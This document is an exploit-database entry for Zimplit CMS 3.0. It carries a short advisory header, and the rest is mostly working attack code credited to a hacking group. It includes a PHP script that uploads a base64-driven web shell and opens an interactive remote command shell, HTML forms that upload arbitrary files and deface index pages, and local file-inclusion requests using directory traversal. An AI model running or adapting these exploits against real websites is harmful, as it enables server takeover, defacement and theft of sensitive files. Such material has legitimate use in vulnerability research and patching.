@@ -1,0 +1,191 @@
+source: http://www.securityfocus.com/bid/53990/info
+
+Zimplit CMS is prone to multiple local file-include vulnerabilities and an arbitrary file-upload vulnerability.
+
+An attacker can exploit these issues to upload arbitrary files onto the web server, execute arbitrary local files within the context of the web server, and obtain sensitive information.
+
+Zimplit CMS 3.0 is vulnerable; other versions may also be affected. 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm KedAns-Dz member from Inj3ct0r Team                1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+###
+# Title : Zimplit CMS v3.0 <= (FU/XSRF/LFI) Multiple Vulnerabilities
+# Author : KedAns-Dz
+# E-mail : ked-h (@hotmail.com / @1337day.com / @exploit-id.com / @dis9.com)
+# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
+# Web Site : www.1337day.com | www.inj3ct0rs.com
+# FaCeb0ok : http://fb.me/Inj3ct0rK3d
+# Friendly Sites : www.r00tw0rm.com * www.exploit-id.com * www.dis9.com
+# platform : php
+# Type : Multiple Vulnerabilities
+# Tested on : Windows XP-SP3 (Fr) / Ubuntu 10.10 (En)
+# Download : [http://www.zimplit.com/order.html]
+###
+
+# <3 <3 Greetings t0 Palestine <3 <3
+
+# Exploit's / p0c's ====>
+
+##### Exp(1) Arbitrary File/Shell Upload =>
+
+<!-- p0c (1) -->
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+function http_send($host, $packet)
+{
+ $sock = fsockopen($host, 80);
+ while (!$sock)
+ {
+  print "\n[-] No response from {$host}:80 Trying again...";
+  $sock = fsockopen($host, 80);
+ }
+ fputs($sock, $packet);
+ while (!feof($sock)) $resp .= fread($sock, 1024);
+ fclose($sock);
+ return $resp;
+}
+print "\n|==================================================|";
+print "\n|   Zimplit CMS v3.0 <= Arbitrary Shell Upload     |";
+print "\n|  Provided By KedAns-Dz <ked-h[at]hotmail[.]com>  |";
+print "\n|==================================================|\n";
+if ($argc < 2)
+{
+ print "\nUsage  : php $argv[0] [host] [path]";
+ print "\nExample : php $argv[0] www.p0c.tld /zimplit/\n";
+ die();
+}
+$host = $argv[1];
+$path = $argv[2];
+$data  = "--31337\r\n";
+$data .= "Content-Disposition: form-data; name=\"File\"; filename=\"k3d.php\"\r\n";
+$data .= "Content-Type: application/octet-stream\r\n\r\n";
+$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
+$data .= "--31337--\r\n";
+$packet  = "POST {$path}/zimplit.php?action=upload&folder=editor/files HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($data)."\r\n";
+$packet .= "Content-Type: multipart/form-data; boundary=31337\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $data;
+preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);
+if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
+else print "\n[-] Shell uploaded to {$html[2]}...starting it!\n";
+define(STDIN, fopen("php://stdin", "r"));
+while(1)
+{
+ print "\n Inj3ct0rK3d-Sh3lL#";
+ $cmd = trim(fgets(STDIN)); # f.ex : C:\\k3d.php
+ if ($cmd != "exit")
+ {
+  $packet = "GET {$path}k3d.php{$html[3]} HTTP/1.0\r\n";
+  $packet.= "Host: {$host}\r\n";
+  $packet.= "Cmd: ".base64_encode($cmd)."\r\n"; # for Encoded You'r Shell
+  $packet.= "Connection: close\r\n\r\n";
+  $output = http_send($host, $packet);
+  if (eregi("print", $output) || !eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
+  $shell = explode("_code_", $output);
+  print "\n{$shell[1]}";
+ }
+ else break;
+}
+?>
+
+<!-- p0c (2) -->
+<form action="http://[Target]/zimplit.php?action=upload&folder=editor/files" method="post">
+<input type="file" name="file" size="50"/>
+<input type="hidden" name="file" />
+<input type="submit" value="Upload Sh3ll/File !" />
+</form>
+
+[+] Access Shell http://[Target]/editor/files/k3d.php
+[+] Access Shell http://[Target]/editor/files/{ U R Shell }.*
+
+##### Exp(2) Edit HTML (index.html) File =>
+
+<form action='http://[target]/zimplit.php?action=save&file=index.html' method='post'>
+<textarea id="html" name="html">
+<center>
+<h1> HaCked By KedAns-Dz </h1>
+</center>
+&lt;/textarea&gt;
+<input type='submit' value='Edit HTML Page'>
+</form>
+
+##### Exp(3) Add new HTML File/Page =>
+
+<form action='http://[target]/zimplit.php?action=new&file=dz0.html' method='post'>
+<textarea id="html" name="html">
+<center>
+<h1> HaCked By KedAns-Dz </h1>
+</center>
+&lt;/textarea&gt;
+<input type='submit' value='Creat new HTML Page'>
+</form>
+
+##### Exp(4) Local File Include =>
+
+<!-- p0c (1) -->
+<form action='http://[target]/zimplit.php?action=load&file=../../../../../../../[ LFI ]%00' method='post'>
+<input type='submit' value='Included Local File'>
+</form>
+
+<!-- p0c (2) -->
+
+<?php
+$lfi =
+curl_init("http://[Target]/editor/zimplit_js.php");
+curl_setopt($lfi, CURLOPT_POST, true);
+curl_setopt($lfi, CURLOPT_POSTFIELDS,
+  array('lang'=>"../../../../../../../../[ LFI ]%00"));
+curl_setopt($lfi, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($lfi);
+curl_close($lfi);
+print "$postResult";
+?>
+
+<!-- p0c (3) -->
+
+<?php
+$lfi =
+curl_init("http://[Target]/editor/user.php");
+curl_setopt($lfi, CURLOPT_POST, true);
+curl_setopt($lfi, CURLOPT_POSTFIELDS,
+  array('lang'=>"../../../../../../../../[ LFI ]%00"));
+curl_setopt($lfi, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($lfi);
+curl_close($lfi);
+print "$postResult";
+?>
+
+#### << ThE|End
+
+#================[ Exploited By KedAns-Dz * Inj3ct0r Team * ]===============================================
+# Greets To : Dz Offenders Cr3w < Algerians HaCkerS > | Caddy-Dz * Mennouchi Islem * Rizky Oz * HMD-Cr3w
+# +> Greets To Inj3ct0r Operators Team : r0073r * Sid3^effectS * r4dc0re (1337day.com) * CrosS (r00tw0rm.com)
+# Inj3ct0r Members 31337 : Indoushka * KnocKout * SeeMe * Kalashinkov3 * ZoRLu * anT!-Tr0J4n * Angel Injection
+# NuxbieCyber (www.1337day.com/team) * Dz Offenders Cr3w * Algerian Cyber Army * xDZx * TM.mOsta * HD Moore
+# Exploit-ID Team : jos_ali_joe + Caddy-Dz + kaMtiEz + r3m1ck (exploit-id.com) * Jago-dz * Over-X * KeyStr0ke
+# JF * Kha&miX * Ev!LsCr!pT_Dz * KinG Of PiraTeS * TrOoN * T0xic * L3b-r1Z * Chevr0sky * Black-ID * Barbaros-DZ
+# packetstormsecurity.org * metasploit.com * r00tw0rm.com * OWASP Dz * Dis9-UE * All Security and Exploits Webs
+#============================================================================================================
+
